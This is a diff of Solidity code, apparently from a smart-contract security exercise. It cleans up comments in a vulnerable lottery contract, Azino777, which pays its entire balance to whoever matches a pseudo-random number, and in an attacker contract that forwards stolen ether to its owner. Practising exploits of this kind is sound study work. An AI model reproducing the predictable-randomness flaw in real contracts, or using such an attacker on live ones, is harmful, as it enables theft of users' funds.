@@ -17,23 +17,11 @@ contract Azino777 {
         
         uint256 num = rand(100);        
 
-        if (num == bet) {          
-            
-            //(bool sent, bytes memory data) = payable(msg.sender).call{value : msg.value}("");
-            //console.log(address(this).balance);        
-
-            //payable(msg.sender).transfer(address(this).balance);
-
-            //payable(msg.sender).transfer(0.1 ether);
-
+        if (num == bet) {     
 
            (bool succes, ) =  payable(msg.sender).call{value : address(this).balance}("");
-            require(succes, "Failed to send Ether");
-
+            require(succes, "Failed to send Ether");            
             
-            //console.log(succes);      
-
-            //require(sent, "Failed to send ether");
         }
     }
 
@@ -81,10 +69,8 @@ contract AtackAzino777{
     }
 
     receive() external payable {
-        //console.log("antes: " , ownerAtack.balance);
         (bool succes, ) =  payable(ownerAtack).call{value : msg.value}("");
         require(succes, "Failed to send Ether");
-        //console.log("despues: " , ownerAtack.balance);
     }
 
     function owner() public view returns(address){
